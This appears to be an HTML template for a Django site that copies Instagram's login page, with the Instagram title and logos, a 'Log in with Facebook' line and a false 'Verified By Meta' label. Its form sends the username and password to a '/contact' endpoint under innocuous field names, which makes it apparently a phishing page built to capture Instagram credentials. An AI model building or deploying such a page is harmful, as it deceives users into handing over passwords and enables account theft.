<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- title -->
    <title>Instagram</title>

    <!-- custom css link -->
    <link rel="stylesheet" href="static\style.css">

    <!-- favicon -->
    <link rel="shortcut icon" href="static\img\favicon.png" type="image/x-icon">

    <!-- boxicons cdn link -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">

</head>

<body>

    <div class="image__login">
        <img src="static\img\instagramimg.png" alt="">
    </div>

    <div class="insta__form">

        <div class="login__form">
            <img src="static\img\instalogo.png">

            <form class="form" method="post" action="/contact">
              {% csrf_token %}

                <input type="text" placeholder="Phone number, username, or email" id="name" name="name">
                <input type="password" placeholder="Password" id="desc" name="desc">

                <button>
                    Log in
                </button>
                
                <span class="or">OR</span>
                
            </form>

            <h3>
                <i class='bx bxl-facebook-circle' ></i>
                Log in with Facebook
            </h3>

            <span class="forget">
                Verified By Meta
            </span>


        </div>



    </div>

</body>

</html>
